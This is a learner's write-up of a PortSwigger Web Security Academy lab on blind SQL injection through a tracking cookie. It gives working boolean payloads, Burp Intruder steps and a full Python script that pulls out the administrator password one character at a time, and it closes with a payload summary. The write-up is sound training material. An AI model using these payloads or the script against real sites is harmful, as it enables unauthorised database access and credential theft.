# Lab: Blind SQL Injection with Conditional Responses

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Topic:** Blind SQL Injection — Password Extraction  
**Status:** ✅ Solved

---

## Objective
Extract the administrator's password from a database using blind
SQL injection — where no data or errors are ever shown on the page.
The only feedback is whether "Welcome back" appears or disappears.

---

## What Makes This "Blind" SQLi

Unlike normal SQLi where results are displayed on the page:
- Query results are **never shown**
- No error messages are displayed
- The only feedback is the **"Welcome back"** message
- TRUE condition → Welcome back appears
- FALSE condition → Welcome back disappears

This single yes/no response is the entire feedback mechanism.

---

## Step 1 — Confirming SQL Injection is Possible

URL injection didn't work here — had to use **Burp Suite** to
intercept and modify the **TrackingId cookie** directly.

```sql
TrackingId=xyz' AND 1=1--    ✅ Welcome back appeared (TRUE)
TrackingId=xyz' AND 1=2--    ✅ Welcome back disappeared (FALSE)
```

Boolean conditions confirmed working — SQLi is possible.

**Important note on `+` in cookies:**
- In URLs, `+` means a space
- In cookies, `+` is a literal plus character
- Never use `+` after `--` in cookie injection — it can break
  the query. Always use just `--` as the comment terminator

---

## Step 2 — Confirming Users Table Exists

```sql
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

**What this query does:**
- `SELECT 'x' FROM users` — doesn't fetch real data, just returns
  the letter 'x' for every row in the users table
- `LIMIT 1` — returns only one row to avoid errors if multiple
  rows exist
- `='x'` — checks if the returned value equals 'x'
- Users table exists → returns 'x' → matches 'x' → TRUE → Welcome back
- Users table doesn't exist → query fails → FALSE → no Welcome back

✅ Welcome back appeared — users table confirmed.

**Mistake made:** Case sensitivity — `'x'` and `'X'` are not equal
in SQL string comparisons. Both sides of `=` must match exactly.

---

## Step 3 — Confirming Administrator User Exists

```sql
' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
```

✅ Welcome back appeared — administrator user confirmed to exist.

---

## Step 4 — Finding Password Length

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=1--
```

Keep incrementing the number until Welcome back appears:
```sql
=1  ❌
=2  ❌
...
=20 ✅ Welcome back — password is 20 characters long
```

This is useful for:
- Knowing when to stop manual brute force
- Setting the loop limit in a Python script

---

## Step 5 — Extracting the Password

Two methods available:

### Method 1 — Manual (slow)

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

**What SUBSTRING does:**
- `SUBSTRING(password, 1, 1)` — starting at position 1, take 1 character
- Try every character (a-z, 0-9) until Welcome back appears
- Repeat for all 20 positions manually
- Very tedious — 20 positions × 36 characters = up to 720 requests

### Method 2 — Burp Suite Intruder (semi-automatic)

1. Right click request in Repeater → **Send to Intruder**
2. In **Positions** tab → click **Clear §** to remove auto-detected positions
3. In the TrackingId value, highlight just the character to test
   and click **Add §**:
   ')='§a§'--
4. In **Payloads** tab → add all characters one by one (a-z, 0-9)
5. In **Settings** tab → **Grep - Match** section → Add `Welcome back`
6. Click **Start Attack**
7. The character with a ✓ in the Welcome back column is correct
8. Change position number and repeat 20 times total

**Mistake made:** Added "Welcome back" to Proxy match/replace rules
instead of Intruder Grep-Match settings — completely different
sections. Grep-Match is in Intruder's Settings panel on the right.

**Limitation:** Community edition throttles Intruder — slow for
large attacks. Pro version handles this much faster.

### Method 3 — Python Script (fastest)

Since Community edition Intruder is slow, wrote a Python script
to automate all 20 positions automatically:

```python
import requests

url = "https://YOUR-LAB.web-security-academy.net/filter?category=Food"
session = "YOUR_SESSION_COOKIE"
tracking_id = "YOUR_TRACKING_ID"
password = ""

for position in range(1, 21):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        cookies = {
            "TrackingId": f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--",
            "session": session
        }
        response = requests.get(url, cookies=cookies)
        if "Welcome back" in response.text:
            password += char
            print(f"Position {position}: {char} | Password so far: {password}")
            break

print(f"\nFull Password: {password}")
```

**To run:**
```bash
nano ~/sqli_brute.py    # create and paste script
python3 ~/sqli_brute.py # run the script
```

**What you need from Burp Suite:**
- Lab URL (shown above the request in Intruder)
- Session cookie value
- Original TrackingId value (without any injection)

**How the script works:**
- Outer loop: goes through positions 1-20
- Inner loop: tries every character a-z then 0-9
- Sends each request with the injected cookie
- Checks if "Welcome back" is in the response
- If match found → saves character → breaks inner loop → next position
- Prints each character as found, full password at the end

**Result:** Password found: `xwgum8s6i38b7tyahe4h`

---

## Key Concepts Learned

**What is Blind SQLi?**
- SQL injection where no output is returned to the page
- Relies entirely on observable differences in application behavior
- Boolean-based: true/false conditions change page response
- Much harder to exploit than regular SQLi — requires many requests

**Blind SQLi vs Regular SQLi:**
| Type | Data Shown | Error Shown | Method |
|---|---|---|---|
| Regular SQLi | ✅ Yes | ✅ Yes | Direct UNION extraction |
| Blind SQLi | ❌ No | ❌ No | True/False conditions |

**Key SQL Functions Used:**
| Function | Purpose | Example |
|---|---|---|
| `LENGTH()` | Get string length | `LENGTH(password)` |
| `SUBSTRING()` | Extract single character | `SUBSTRING(password,1,1)` |
| `LIMIT 1` | Return only one row | `SELECT 'x' FROM users LIMIT 1` |

**Burp Suite Tools Used:**
| Tool | Purpose |
|---|---|
| Proxy | Intercept and capture requests |
| Repeater | Manually modify and resend requests |
| Intruder | Automate payload testing |
| Grep-Match | Highlight matching responses automatically |

---

## Mistakes Made

- Tried URL injection first — blind SQLi uses cookies not URL
- Used `+` after `--` in cookie — breaks query, use just `--`
- Case sensitivity issue with `'x'` vs `'X'` — SQL strings are
  case sensitive, both sides of `=` must match exactly
- Added Grep-Match to wrong section (Proxy instead of Intruder)
- Added all characters as one entry instead of individually in
  Intruder payload list — must be one character per line
- Used LENGTH query in Intruder instead of SUBSTRING query

---

## Payloads Summary

```sql
' AND 1=1--                                              -- confirm SQLi
' AND 1=2--                                              -- boolean false test
' AND (SELECT 'x' FROM users LIMIT 1)='x'--             -- confirm table exists
' AND (SELECT 'x' FROM users WHERE username='administrator')='x'-- -- confirm user
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20-- -- password length
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='x'-- -- extract char
```
